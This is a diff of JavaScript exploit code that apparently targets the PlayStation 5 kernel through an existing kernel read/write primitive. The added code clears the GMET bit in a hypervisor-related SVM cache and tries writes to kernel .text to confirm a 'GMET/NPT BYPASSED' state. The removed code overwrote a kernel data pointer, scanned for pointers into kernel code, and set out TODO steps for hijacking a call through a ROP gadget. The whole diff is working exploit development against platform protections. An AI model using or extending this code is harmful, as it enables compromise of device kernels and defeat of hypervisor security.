@@ -663,60 +663,70 @@ async function main(userlandRW, wkOnly = false) {
                 await log("[PTR] 0x" + ptr.offset.toString(16) + ": " + ptr.value + " " + category, LogLevel.INFO);
             }
 
-            // Test pointer modification
-            let doTest = confirm(
-                "TEST POINTER MODIFICATION\n\n" +
-                "Pointer at 0x4a48: " + ptr4a48 + "\n" +
-                "Target: ktextBase + 0x" + ptrOffset.toString(16) + "\n\n" +
-                "This will modify, verify, and restore the pointer.\n\n" +
-                "OK = Test\nCancel = Skip"
+            // =========================================================================
+            // REST MODE TEST: Modify SVM cache, go to rest, check after wake
+            // =========================================================================
+
+            const SVM_CACHE_OFFSET = 0x4bf0;
+            let svmCache = await krw.read4(krw.kdataBase.add32(SVM_CACHE_OFFSET));
+            let gmetBit = (svmCache & 0x40000) !== 0;
+
+            await log("========== SVM CACHE / GMET TEST ==========", LogLevel.SUCCESS);
+            await log("[SVM] Cache at 0x4bf0: 0x" + svmCache.toString(16), LogLevel.INFO);
+            await log("[SVM] GMET bit (18): " + (gmetBit ? "SET" : "CLEAR"), gmetBit ? LogLevel.WARN : LogLevel.SUCCESS);
+
+            let doSvmTest = confirm(
+                "REST MODE GMET TEST\n\n" +
+                "Current SVM cache: 0x" + svmCache.toString(16) + "\n" +
+                "GMET bit 18: " + (gmetBit ? "SET (enabled)" : "CLEAR (disabled)") + "\n\n" +
+                "Options:\n" +
+                "OK = Clear GMET bit (for rest mode test)\n" +
+                "Cancel = Skip\n\n" +
+                "After clearing, put PS5 to rest, wake up,\n" +
+                "run exploit again to check if change persisted."
             );
 
-            if (doTest) {
-                let original = await krw.read8(krw.kdataBase.add32(0x4a48));
-                let testVal = new int64(original.low ^ 0x1000, original.hi);
+            if (doSvmTest) {
+                if (gmetBit) {
+                    let newValue = svmCache & ~0x40000;
+                    await log("[SVM] Clearing GMET bit...", LogLevel.WARN);
+                    await krw.write4(krw.kdataBase.add32(SVM_CACHE_OFFSET), newValue);
 
-                await log("[TEST] Writing: " + testVal, LogLevel.WARN);
-                await krw.write8(krw.kdataBase.add32(0x4a48), testVal);
+                    let verify = await krw.read4(krw.kdataBase.add32(SVM_CACHE_OFFSET));
+                    await log("[SVM] New value: 0x" + verify.toString(16), LogLevel.INFO);
+                    await log("[SVM] GMET bit now: " + ((verify & 0x40000) ? "SET" : "CLEAR"), LogLevel.SUCCESS);
 
-                let verify = await krw.read8(krw.kdataBase.add32(0x4a48));
+                    if ((verify & 0x40000) === 0) {
+                        await log("[SVM] SUCCESS! GMET bit cleared!", LogLevel.SUCCESS);
+                        await log("[SVM] Now put PS5 to REST MODE", LogLevel.WARN);
+                        await log("[SVM] After wake, run exploit again to check", LogLevel.WARN);
+                    }
+                } else {
+                    await log("[SVM] GMET bit already clear! Testing .text write...", LogLevel.SUCCESS);
 
-                if (verify.low === testVal.low && verify.hi === testVal.hi) {
-                    await log("[TEST] SUCCESS! Pointer is WRITABLE!", LogLevel.SUCCESS);
+                    // Try writing to .text since GMET appears disabled
+                    let doTextWrite = confirm(
+                        ".TEXT WRITE TEST\n\n" +
+                        "GMET bit is CLEAR!\n\n" +
+                        "Try writing to kernel .text?\n" +
+                        "(Writes same byte back - safe test)\n\n" +
+                        "OK = Try .text write\n" +
+                        "Cancel = Skip"
+                    );
 
-                    await krw.write8(krw.kdataBase.add32(0x4a48), original);
-                    await log("[TEST] Restored original value", LogLevel.INFO);
+                    if (doTextWrite) {
+                        await log("[.TEXT] Reading byte from ktextBase...", LogLevel.WARN);
+                        let textByte = await krw.read1(krw.ktextBase);
+                        await log("[.TEXT] Read: 0x" + textByte.toString(16), LogLevel.INFO);
 
-                    // Scan for all pointers in writable region
-                    await log("[SCAN] Scanning writable region for all kernel pointers...", LogLevel.WARN);
-
-                    let foundPointers = [];
-                    for (let off = 0; off < 0x10000; off += 8) {
-                        let val = await krw.read8(krw.kdataBase.add32(off));
-                        if (val.hi === 0xffffffff && (val.low & 0x80000000)) {
-                            if (val.low === 0xffffffff) continue;
-                            let lowHex = val.low.toString(16).padStart(8, '0');
-                            if (lowHex.match(/^f{4,}/) || lowHex.match(/0{4,}$/)) continue;
-
-                            let textOff = val.low - krw.ktextBase.low;
-                            if (textOff >= 0 && textOff < 0x1000000) {
-                                foundPointers.push({ offset: off, value: val, textOffset: textOff });
-                            }
+                        await log("[.TEXT] Writing same byte back...", LogLevel.WARN);
+                        try {
+                            await krw.write1(krw.ktextBase, textByte);
+                            await log("[.TEXT] WRITE SUCCEEDED! GMET/NPT BYPASSED!", LogLevel.SUCCESS);
+                        } catch (e) {
+                            await log("[.TEXT] Write failed: " + e, LogLevel.ERROR);
                         }
                     }
-
-                    await log("[SCAN] Found " + foundPointers.length + " pointers to .text in writable region", LogLevel.SUCCESS);
-
-                    for (let ptr of foundPointers) {
-                        await log("[PTR] 0x" + ptr.offset.toString(16) + " -> ktextBase+0x" + ptr.textOffset.toString(16), LogLevel.WARN);
-                    }
-
-                    await log("========== NEXT STEPS ==========", LogLevel.SUCCESS);
-                    await log("[TODO] 1. Identify what these pointers are used for", LogLevel.INFO);
-                    await log("[TODO] 2. Find how to trigger a call through one of them", LogLevel.INFO);
-                    await log("[TODO] 3. Redirect to ROP gadget for code execution", LogLevel.INFO);
-                } else {
-                    await log("[TEST] Write failed", LogLevel.ERROR);
                 }
             }
         }
